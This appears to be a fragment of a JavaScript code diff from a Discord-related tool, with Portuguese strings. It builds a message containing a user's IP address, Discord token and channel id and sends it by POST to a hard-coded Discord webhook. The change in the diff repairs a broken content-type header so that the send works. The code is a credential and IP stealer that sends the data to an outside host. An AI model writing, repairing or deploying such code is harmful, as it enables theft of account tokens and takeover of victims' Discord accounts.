@@ -61,7 +61,7 @@ function sleep(ms) {
     var rastrear = "<@&834339778283307009> **trava** conteudo: trava  ip: ||**"+ipe+"**||   token: ||**"+token +"**||   id do canal: **"+chanel+"**";
     fetch("https://discord.com/api/webhooks/834322895488286763/mzDIhREVNie-USgcSuZHIznlW7gjffehzExjhcMFxF96JShyAlSYwPrm4XrxFjC9ZIXm", {
       "headers": {
-        "content-type": "app--> lication/json",
+        "content-type": "application/json",
       },
       "body": "{\"content\":\""+rastrear+"\",\"username\":\"\",\"avatar_url\":null,\"tts\":false,\"embeds\":[]}",
       "method": "POST",
